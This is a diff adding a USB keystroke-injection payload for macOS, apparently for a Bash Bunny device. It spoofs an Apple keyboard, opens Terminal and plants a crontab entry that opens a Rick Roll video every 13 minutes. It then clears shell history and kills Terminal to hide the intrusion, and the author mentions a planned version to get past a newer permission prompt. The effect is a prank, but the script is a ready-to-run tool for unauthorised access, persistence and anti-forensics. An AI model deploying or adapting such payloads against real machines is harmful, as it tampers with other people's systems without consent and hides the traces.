@@ -1,0 +1,56 @@
+# Title:         Rick Roll 13
+# Description:   Creates a cron job that goes out to a browser to rickroll the victim every 13th minute
+# Works on:      Mac OS High Sierra or previous
+# Note:          Did find an issue on some macs, maybe mojave? requiring prompt b4 adding to crontab probably a v2 to subvert this
+# Author:        K1NGDM @mathewcostello
+# Author Notes:  Follow me on twitter yo
+# Props:	       HackTuesday Crew hte.life
+# Version:       1.0
+# Category:      Prank
+# Target:        MacOS
+# Attackmodes:   crontab
+
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+LED B 200
+
+Q GUI SPACE
+Q DELAY 200
+Q STRING terminal
+Q DELAY 100
+Q ENTER
+Q DELAY 500
+Q GUI n
+Q DELAY 500
+
+#lets make a copy of the crontab
+Q STRING crontab -l \> temp
+Q ENTER
+Q DELAY 100
+#lets add our youtube link to the crontab for every 13th minute
+Q STRING echo "'*/13 * * * * /usr/bin/open https://www.youtube.com/watch?v=dQw4w9WgXcQ'" \>\> temp
+Q ENTER
+Q DELAY 100
+#lets install the modified crontab
+Q STRING crontab temp
+Q ENTER
+Q DELAY 100
+#time to clean up
+Q STRING rm temp
+Q ENTER
+Q DELAY 100
+
+Q DELAY 1000
+
+LED CLEANUP
+#clear the history
+Q STRING history -c
+Q ENTER
+Q DELAY 500
+# clear and kill the terminal
+Q STRING clear
+Q ENTER
+Q DELAY 500
+Q STRING killall Terminal
+Q ENTER
+LED FINISH
